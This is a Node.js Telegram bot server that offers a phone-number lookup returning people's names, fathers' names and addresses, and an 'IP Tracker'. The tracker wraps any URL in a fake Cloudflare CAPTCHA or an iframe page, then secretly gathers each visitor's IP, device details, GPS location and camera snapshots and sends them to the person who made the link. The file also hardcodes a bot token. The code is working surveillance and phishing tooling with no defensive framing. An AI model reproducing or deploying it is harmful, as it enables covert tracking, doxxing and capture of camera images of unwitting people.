const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const path = require('path');

// ==================== 🔧 CONFIGURATION ====================
const CONFIG = {
  // Bot Settings
  BOT_TOKEN: '8377073485:AAERCkZcNZhupFa2Rs2uWrqFhlPQQW2xGqM',
  WEBHOOK_URL: 'https://botu-info-xjjf.onrender.com',
  PORT: process.env.PORT || 10000,
  
  // Admin
  ADMIN_ID: 8175884349,
  DEVELOPER: '@aadi_io',
  
  // API
  MOBILE_API_URL: 'https://demon.taitanx.workers.dev/?mobile=',
  
  // Blacklist
  BLACKLISTED_NUMBERS: ['9161636853', '9451180555', '6306791897'],
  
  // Features
  ENABLE_CAPTCHA: true,
  CAPTCHA_DURATION: 5000, // milliseconds
  ENABLE_CAMERA: true,
  
  // Cache
  CACHE_DURATION: 300000, // 5 minutes
  MAX_CACHE_SIZE: 100,
  MAX_HISTORY: 50
};

const bot = new TelegramBot(CONFIG.BOT_TOKEN);
const app = express();

// ==================== Middlewares ====================
app.use(cors());
app.use(bodyParser.json({ limit: '20mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// ==================== Data Storage ====================
const stats = {
  total: 0,
  success: 0,
  failed: 0,
  blocked: 0,
  users: new Set(),
  ipLinks: 0,
  ipClicks: 0,
  locations: 0,
  cameras: 0,
  startTime: Date.now()
};

const cache = new Map();
const states = new Map();
const history = [];
const activity = new Map();

// ==================== Utils ====================
function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
         req.headers['x-real-ip'] ||
         req.connection?.remoteAddress || 
         req.ip || 'Unknown';
}

function getTime() {
  return new Date().toLocaleString('en-IN', { 
    timeZone: 'Asia/Kolkata',
    hour12: false 
  });
}

function uptime() {
  const t = Math.floor((Date.now() - stats.startTime) / 1000);
  const d = Math.floor(t / 86400);
  const h = Math.floor((t % 86400) / 3600);
  const m = Math.floor((t % 3600) / 60);
  const s = t % 60;
  return d > 0 ? `${d}d ${h}h ${m}m` : `${h}h ${m}m ${s}s`;
}

function cleanNumber(num) {
  let n = num.replace(/\D/g, '');
  if (n.startsWith('91') && n.length > 10) n = n.slice(2);
  if (n.startsWith('0') && n.length === 11) n = n.slice(1);
  return n.length > 10 ? n.slice(-10) : n;
}

function formatPhone(p) {
  if (!p) return 'N/A';
  const n = cleanNumber(p);
  return n.length === 10 ? `+91 ${n.slice(0, 5)} ${n.slice(5)}` : p;
}

function formatAddress(a) {
  if (!a || a === 'null') return 'N/A';
  const parts = a.replace(/!!/g, '!').split('!')
    .map(p => p.trim())
    .filter(p => p && p !== 'null' && p.length > 2)
    .slice(0, 4);
  return parts.length ? parts.join('\n') : 'N/A';
}

function logSearch(uid, name, num, status) {
  history.push({ time: new Date(), uid, name, num, status });
  if (history.length > CONFIG.MAX_HISTORY) history.shift();

  if (!activity.has(uid)) {
    activity.set(uid, { name, count: 0, last: null });
  }
  const user = activity.get(uid);
  user.count++;
  user.last = new Date();
}

function cleanCache() {
  if (cache.size > CONFIG.MAX_CACHE_SIZE) {
    const entries = Array.from(cache.entries());
    entries.sort((a, b) => a[1].time - b[1].time);
    const toDelete = entries.slice(0, Math.floor(CONFIG.MAX_CACHE_SIZE / 2));
    toDelete.forEach(([key]) => cache.delete(key));
  }
}

// ==================== Keyboards ====================
const mainKeyboard = (isAdmin = false) => ({
  inline_keyboard: [
    [{ text: '🔍 Number Lookup', callback_data: 'number_info' }],
    [{ text: '🌐 IP Tracker', callback_data: 'ip_tracker' }],
    ...(isAdmin ? [[{ text: '⚙️ Admin Panel', callback_data: 'admin' }]] : []),
    [{ text: '💬 Developer', url: `https://t.me/${CONFIG.DEVELOPER.slice(1)}` }]
  ]
});

const adminKeyboard = {
  inline_keyboard: [
    [
      { text: '📊 Stats', callback_data: 'stats' },
      { text: '🏓 Ping', callback_data: 'ping' }
    ],
    [
      { text: '📜 History', callback_data: 'history' },
      { text: '👥 Users', callback_data: 'users' }
    ],
    [
      { text: '🗑️ Clear Cache', callback_data: 'clear_cache' },
      { text: '🔙 Back', callback_data: 'menu' }
    ]
  ]
};

const resultKeyboard = {
  inline_keyboard: [
    [
      { text: '🔄 New Search', callback_data: 'number_info' },
      { text: '🏠 Menu', callback_data: 'menu' }
    ]
  ]
};

const ipKeyboard = {
  inline_keyboard: [
    [{ text: '✨ Create New Link', callback_data: 'ip_tracker' }],
    [{ text: '🏠 Menu', callback_data: 'menu' }]
  ]
};

// ==================== Messages ====================
const welcomeMsg = (name, isAdmin) => `
╔══════════════════════╗
║  <b>🤖 Multi-Info Bot</b>   ║
╚══════════════════════╝

👋 Welcome <b>${name}</b>!

<b>📋 Available Services:</b>

🔍 <b>Number Lookup</b>
   • Mobile info search
   • Name & address
   • Carrier details

🌐 <b>IP Tracker</b>
   • Location tracking
   • Device info
   • Camera capture

${isAdmin ? '\n🔐 <b>Admin Access</b>\n' : ''}
━━━━━━━━━━━━━━━━━━━━━
<i>Select a service below ⬇️</i>
`;

const statsMsg = () => {
  const rate = stats.total > 0 ? ((stats.success / stats.total) * 100).toFixed(1) : 0;
  return `
╔══════════════════════╗
║   <b>📊 Statistics</b>      ║
╚══════════════════════╝

<b>📱 Number Lookup</b>
├─ Total: <code>${stats.total}</code>
├─ Success: <code>${stats.success}</code> (${rate}%)
├─ Failed: <code>${stats.failed}</code>
└─ Blocked: <code>${stats.blocked}</code>

<b>🌐 IP Tracker</b>
├─ Links: <code>${stats.ipLinks}</code>
├─ Clicks: <code>${stats.ipClicks}</code>
├─ Locations: <code>${stats.locations}</code>
└─ Cameras: <code>${stats.cameras}</code>

<b>👥 Users</b>
├─ Total: <code>${stats.users.size}</code>
├─ Active: <code>${activity.size}</code>
└─ Cache: <code>${cache.size}</code>

<b>⚙️ System</b>
├─ Uptime: <code>${uptime()}</code>
└─ Protected: <code>${CONFIG.BLACKLISTED_NUMBERS.length}</code>

━━━━━━━━━━━━━━━━━━━━━
<i>${new Date().toLocaleTimeString()}</i>
`;
};

const historyMsg = () => {
  if (history.length === 0) {
    return `<b>📜 Search History</b>\n\n<i>No searches yet</i>`;
  }

  const icons = { success: '✅', failed: '❌', blacklist: '🚫' };
  let txt = `╔══════════════════════╗\n║  <b>📜 History</b>          ║\n╚══════════════════════╝\n\n`;

  history.slice(-10).reverse().forEach((e, i) => {
    const icon = icons[e.status] || '⚪️';
    const time = e.time.toLocaleTimeString('en-IN', { hour12: false });
    txt += `${i + 1}. ${icon} <code>${formatPhone(e.num)}</code>\n`;
    txt += `   👤 ${e.name} • 🕐 ${time}\n\n`;
  });

  return txt + `━━━━━━━━━━━━━━━━━━━━━\n<i>Total: ${history.length}</i>`;
};

const usersMsg = () => {
  if (activity.size === 0) {
    return `<b>👥 Users</b>\n\n<i>No activity yet</i>`;
  }

  const sorted = Array.from(activity.entries())
    .sort((a, b) => b[1].count - a[1].count)
    .slice(0, 10);

  let txt = `╔══════════════════════╗\n║  <b>👥 Top Users</b>        ║\n╚══════════════════════╝\n\n`;

  sorted.forEach(([uid, data], i) => {
    const last = data.last ? data.last.toLocaleDateString('en-IN') : 'Never';
    const medal = i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : `${i + 1}.`;
    txt += `${medal} <b>${data.name}</b>\n`;
    txt += `   🔍 ${data.count} • 📅 ${last}\n\n`;
  });

  return txt + `━━━━━━━━━━━━━━━━━━━━━\n<i>Total: ${activity.size}</i>`;
};

// ==================== API ====================
async function fetchMobileInfo(mobile) {
  const cleaned = cleanNumber(mobile);
  
  if (CONFIG.BLACKLISTED_NUMBERS.includes(cleaned)) {
    stats.blocked++;
    return { blocked: true };
  }

  const cached = cache.get(cleaned);
  if (cached && (Date.now() - cached.time) < CONFIG.CACHE_DURATION) {
    return cached.data;
  }

  try {
    stats.total++;
    const response = await axios.get(`${CONFIG.MOBILE_API_URL}${cleaned}`, { 
      timeout: 15000 
    });

    if (response.data && typeof response.data === 'object') {
      cache.set(cleaned, { data: response.data, time: Date.now() });
      cleanCache();
      stats.success++;
      return response.data;
    }

    stats.failed++;
    return null;
  } catch (error) {
    stats.failed++;
    console.error('API Error:', error.message);
    return null;
  }
}

function formatResult(data, num) {
  if (data?.blocked) {
    return `
╔══════════════════════╗
║  <b>🚫 Access Denied</b>   ║
╚══════════════════════╝

📱 <code>${formatPhone(num)}</code>

⛔️ This number is <b>protected</b>

<i>Nice try! 🤡</i>

━━━━━━━━━━━━━━━━━━━━━
<i>Security by ${CONFIG.DEVELOPER}</i>
`;
  }

  if (!data || !data.data || !Array.isArray(data.data) || data.data.length === 0) {
    return `
╔══════════════════════╗
║   <b>❌ No Results</b>      ║
╚══════════════════════╝

📱 <code>${formatPhone(num)}</code>

<i>No information available</i>

━━━━━━━━━━━━━━━━━━━━━
<i>Try another number</i>
`;
  }

  const unique = [];
  const seen = new Set();

  data.data.forEach(r => {
    if (typeof r === 'object') {
      const key = JSON.stringify(r);
      if (!seen.has(key)) {
        seen.add(key);
        unique.push(r);
      }
    }
  });

  if (unique.length === 0) {
    return `<b>❌ Empty</b>\n\n📱 <code>${formatPhone(num)}</code>`;
  }

  const results = unique.slice(0, 3).map((r, i) => {
    const name = r.name || 'N/A';
    const fname = r.fname || 'N/A';
    const mobile = formatPhone(r.mobile || num);
    const alt = r.alt && r.alt !== 'null' ? formatPhone(r.alt) : 'N/A';
    const circle = r.circle || 'N/A';
    const uid = r.id || 'N/A';
    const addr = formatAddress(r.address || '');

    const header = unique.length > 1 ? `Result ${i + 1}` : 'Result';

    return `
╔══════════════════════╗
║  <b>✅ ${header}</b>  ║
╚══════════════════════╝

👤 <b>${name}</b>
👨 Father: ${fname}

<b>📱 Contact</b>
├─ Primary: <code>${mobile}</code>
└─ Alternate: <code>${alt}</code>

<b>🌐 Network</b>
├─ Circle: ${circle}
└─ ID: <code>${uid}</code>

<b>📍 Address</b>
${addr}

━━━━━━━━━━━━━━━━━━━━━
<i>by ${CONFIG.DEVELOPER}</i>
`;
  });

  return results.join('\n');
}

// ==================== IP Tracker Routes ====================
app.get('/c/:path/:uri', (req, res) => {
  stats.ipClicks++;
  if (req.params.path) {
    res.render('cloudflare', {
      ip: getIP(req),
      time: getTime(),
      url: Buffer.from(req.params.uri, 'base64').toString(),
      uid: req.params.path,
      host: CONFIG.WEBHOOK_URL,
      duration: CONFIG.CAPTCHA_DURATION
    });
  } else {
    res.redirect(`https://t.me/${CONFIG.DEVELOPER.slice(1)}`);
  }
});

app.get('/w/:path/:uri', (req, res) => {
  stats.ipClicks++;
  if (req.params.path) {
    res.render('webview', {
      ip: getIP(req),
      time: getTime(),
      url: Buffer.from(req.params.uri, 'base64').toString(),
      uid: req.params.path,
      host: CONFIG.WEBHOOK_URL
    });
  } else {
    res.redirect(`https://t.me/${CONFIG.DEVELOPER.slice(1)}`);
  }
});

app.post('/location', async (req, res) => {
  const { lat, lon, uid, acc } = req.body;
  
  if (lat && lon && uid && acc) {
    try {
      const userId = parseInt(uid, 36);
      stats.locations++;
      
      await bot.sendLocation(userId, parseFloat(lat), parseFloat(lon));
      await bot.sendMessage(userId, 
        `╔══════════════════════╗\n║ <b>📍 Location</b>         ║\n╚══════════════════════╝\n\n<b>Coordinates</b>\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\nAccuracy: <code>${acc}m</code>\n\n🗺️ <a href="https://www.google.com/maps?q=${lat},${lon}">View on Google Maps</a>\n\n━━━━━━━━━━━━━━━━━━━━━\n<i>${getTime()}</i>`,
        { parse_mode: 'HTML', disable_web_page_preview: true }
      );
      res.send('OK');
    } catch (err) {
      console.error('Location error:', err.message);
      res.send('Error');
    }
  } else {
    res.send('Invalid');
  }
});

app.post('/info', async (req, res) => {
  const { uid, data } = req.body;

  if (uid && data) {
    try {
      await bot.sendMessage(parseInt(uid, 36), data.replace(/<br>/g, '\n'), { 
        parse_mode: 'HTML' 
      });
      res.send('OK');
    } catch (err) {
      console.error('Info error:', err.message);
      res.send('Error');
    }
  } else {
    res.send('Invalid');
  }
});

app.post('/camsnap', async (req, res) => {
  const { uid, img } = req.body;

  if (uid && img) {
    try {
      const buffer = Buffer.from(img, 'base64');
      stats.cameras++;
      
      await bot.sendPhoto(parseInt(uid, 36), buffer, {
        caption: `╔══════════════════════╗\n║ <b>📷 Camera</b>           ║\n╚══════════════════════╝\n\n<i>${getTime()}</i>`,
        parse_mode: 'HTML'
      });
      res.send('OK');
    } catch (err) {
      console.error('Camera error:', err.message);
      res.send('Error');
    }
  } else {
    res.send('Invalid');
  }
});

// ==================== Bot Handlers ====================
app.post(`/${CONFIG.BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.first_name || 'User';
  
  stats.users.add(userId);

  // Handle URL input
  if (states.get(chatId) === 'waiting_url') {
    const text = msg.text;
    const hasInvalidChars = [...text].some(c => c.charCodeAt(0) > 127);

    if ((text.includes('http://') || text.includes('https://')) && !hasInvalidChars) {
      const encoded = Buffer.from(text).toString('base64');
      const urlPath = `${chatId.toString(36)}/${encoded}`;
      const cUrl = `${CONFIG.WEBHOOK_URL}/c/${urlPath}`;
      const wUrl = `${CONFIG.WEBHOOK_URL}/w/${urlPath}`;

      stats.ipLinks++;
      states.delete(chatId);

      await bot.sendMessage(chatId, `
╔══════════════════════╗
║ <b>✅ Links Created</b>    ║
╚══════════════════════╝

🔗 <b>Original:</b>
<code>${text}</code>

<b>🌐 CloudFlare (CAPTCHA):</b>
<code>${cUrl}</code>

<b>🌐 WebView (iframe):</b>
<code>${wUrl}</code>

━━━━━━━━━━━━━━━━━━━━━

<b>📊 Tracks:</b>
• 📍 Location • 🌐 IP
• 🖥️ Device • 📷 Camera

<i>Share to track visitors</i>
`, {
        parse_mode: 'HTML',
        reply_markup: ipKeyboard,
        disable_web_page_preview: true
      });
    } else {
      await bot.sendMessage(chatId, 
        '⚠️ <b>Invalid URL</b>\n\nInclude <code>http://</code> or <code>https://</code>',
        { parse_mode: 'HTML' }
      );
    }
    return;
  }

  // Handle number input
  if (states.get(chatId) === 'waiting_number') {
    const num = cleanNumber(msg.text);

    if (!/^\d{10}$/.test(num)) {
      await bot.sendMessage(chatId,
        '<b>❌ Invalid</b>\n\nSend valid 10-digit number\n\n💡 <code>9876543210</code>',
        { parse_mode: 'HTML' }
      );
      return;
    }

    const searchMsg = await bot.sendMessage(chatId,
      '🔍 <b>Searching...</b>',
      { parse_mode: 'HTML' }
    );

    const data = await fetchMobileInfo(num);
    const status = data?.blocked ? 'blacklist' : (data ? 'success' : 'failed');

    logSearch(userId, userName, num, status);

    await bot.deleteMessage(chatId, searchMsg.message_id).catch(() => {});

    const result = data ? formatResult(data, num) : `
╔══════════════════════╗
║  <b>⚠️ Error</b>            ║
╚══════════════════════╝

Unable to fetch data

Try again later

━━━━━━━━━━━━━━━━━━━━━
<i>${CONFIG.DEVELOPER}</i>
`;

    await bot.sendMessage(chatId, result, {
      parse_mode: 'HTML',
      reply_markup: resultKeyboard
    });

    states.delete(chatId);
    return;
  }

  // Commands
  if (msg.text === '/start') {
    await bot.sendMessage(chatId, welcomeMsg(userName, userId === CONFIG.ADMIN_ID), {
      parse_mode: 'HTML',
      reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
    });
  } else if (msg.text === '/admin' && userId === CONFIG.ADMIN_ID) {
    await bot.sendMessage(chatId,
      '╔══════════════════════╗\n║  <b>⚙️ Admin Panel</b>     ║\n╚══════════════════════╝',
      {
        parse_mode: 'HTML',
        reply_markup: adminKeyboard
      }
    );
  } else if (msg.text === '/stats') {
    await bot.sendMessage(chatId, statsMsg(), { parse_mode: 'HTML' });
  } else {
    const num = cleanNumber(msg.text);
    if (/^\d{10}$/.test(num)) {
      states.set(chatId, 'waiting_number');
      
      const searchMsg = await bot.sendMessage(chatId,
        '🔍 <b>Searching...</b>',
        { parse_mode: 'HTML' }
      );

      const data = await fetchMobileInfo(num);
      const status = data?.blocked ? 'blacklist' : (data ? 'success' : 'failed');

      logSearch(userId, userName, num, status);

      await bot.deleteMessage(chatId, searchMsg.message_id).catch(() => {});

      const result = data ? formatResult(data, num) : `
╔══════════════════════╗
║  <b>⚠️ Error</b>            ║
╚══════════════════════╝

Unable to fetch data

━━━━━━━━━━━━━━━━━━━━━
<i>${CONFIG.DEVELOPER}</i>
`;

      await bot.sendMessage(chatId, result, {
        parse_mode: 'HTML',
        reply_markup: resultKeyboard
      });

      states.delete(chatId);
    } else {
      await bot.sendMessage(chatId,
        '<b>💡 Tip</b>\n\nUse menu buttons below',
        {
          parse_mode: 'HTML',
          reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
        }
      );
    }
  }
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const msgId = query.message.message_id;
  const userId = query.from.id;
  const userName = query.from.first_name || 'User';
  const data = query.data;

  await bot.answerCallbackQuery(query.id);

  try {
    switch (data) {
      case 'menu':
        states.delete(chatId);
        await bot.editMessageText(welcomeMsg(userName, userId === CONFIG.ADMIN_ID), {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'HTML',
          reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
        });
        break;

      case 'number_info':
        states.set(chatId, 'waiting_number');
        await bot.editMessageText(
          '╔══════════════════════╗\n║ <b>🔍 Number Lookup</b>   ║\n╚══════════════════════╝\n\n<b>Send 10-digit number</b>\n\n💡 <code>9876543210</code>\n\n<i>No country code</i>',
          {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'HTML'
          }
        );
        break;

      case 'ip_tracker':
        states.set(chatId, 'waiting_url');
        await bot.editMessageText(
          '╔══════════════════════╗\n║  <b>🌐 IP Tracker</b>      ║\n╚══════════════════════╝\n\n<b>Send URL to track</b>\n\n💡 <code>https://example.com</code>\n\n<b>📊 Tracks:</b>\n• 📍 Location\n• 🌐 IP Address\n• 📱 Device\n• 📷 Camera\n\n<i>Include http:// or https://</i>',
          {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'HTML'
          }
        );
        break;

      case 'admin':
        if (userId === CONFIG.ADMIN_ID) {
          await bot.editMessageText(
            '╔══════════════════════╗\n║  <b>⚙️ Admin Panel</b>     ║\n╚══════════════════════╝',
            {
              chat_id: chatId,
              message_id: msgId,
              parse_mode: 'HTML',
              reply_markup: adminKeyboard
            }
          );
        }
        break;

      case 'stats':
        if (userId === CONFIG.ADMIN_ID) {
          await bot.editMessageText(statsMsg(), {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'HTML',
            reply_markup: adminKeyboard
          });
        }
        break;

      case 'ping':
        if (userId === CONFIG.ADMIN_ID) {
          const start = Date.now();
          try {
            await axios.get('https://api.telegram.org');
            const ping = Date.now() - start;
            await bot.answerCallbackQuery(query.id, {
              text: `🏓 Pong!\n\n${ping}ms`,
              show_alert: true
            });
          } catch (err) {
            await bot.answerCallbackQuery(query.id, {
              text: `❌ Error: ${err.message}`,
              show_alert: true
            });
          }
        }
        break;

      case 'history':
        if (userId === CONFIG.ADMIN_ID) {
          await bot.editMessageText(historyMsg(), {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'HTML',
            reply_markup: adminKeyboard
          });
        }
        break;

      case 'users':
        if (userId === CONFIG.ADMIN_ID) {
          await bot.editMessageText(usersMsg(), {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'HTML',
            reply_markup: adminKeyboard
          });
        }
        break;

      case 'clear_cache':
        if (userId === CONFIG.ADMIN_ID) {
          const size = cache.size;
          cache.clear();
          await bot.answerCallbackQuery(query.id, {
            text: `✅ Cache Cleared\n\n${size} entries removed`,
            show_alert: true
          });
        }
        break;
    }
  } catch (err) {
    console.error('Callback error:', err.message);
  }
});

// ==================== Web Routes ====================
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    bot: 'Multi-Info Bot',
    version: '5.0',
    developer: CONFIG.DEVELOPER,
    stats: {
      uptime: uptime(),
      users: stats.users.size,
      requests: stats.total,
      ipLinks: stats.ipLinks
    }
  });
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy', uptime: uptime() });
});

// ==================== Start ====================
async function setupWebhook() {
  try {
    console.log('🔄 Setting up webhook...');
    await bot.deleteWebHook();
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    const webhookUrl = `${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`;
    await bot.setWebHook(webhookUrl);
    
    console.log('✅ Webhook set:', webhookUrl);
    
    const info = await bot.getWebHookInfo();
    console.log('📍 URL:', info.url);
    console.log('📊 Pending:', info.pending_update_count);
    
    return true;
  } catch (err) {
    console.error('❌ Webhook error:', err.message);
    return false;
  }
}

app.listen(CONFIG.PORT, async () => {
  console.log('\n' + '='.repeat(50));
  console.log('🚀 Multi-Info Bot v5.0');
  console.log('='.repeat(50));
  console.log(`👤 Developer: ${CONFIG.DEVELOPER}`);
  console.log(`🆔 Admin: ${CONFIG.ADMIN_ID}`);
  console.log(`🔒 Protected: ${CONFIG.BLACKLISTED_NUMBERS.length}`);
  console.log('='.repeat(50));
  
  const success = await setupWebhook();
  
  if (success) {
    console.log(`\n✅ Port: ${CONFIG.PORT}`);
    console.log('✅ Bot ready!');
    console.log(`🌐 ${CONFIG.WEBHOOK_URL}\n`);
  } else {
    console.log('\n❌ Webhook failed\n');
  }
});

bot.on('polling_error', (err) => console.error('Polling:', err.code));
bot.on('webhook_error', (err) => console.error('Webhook:', err.code));
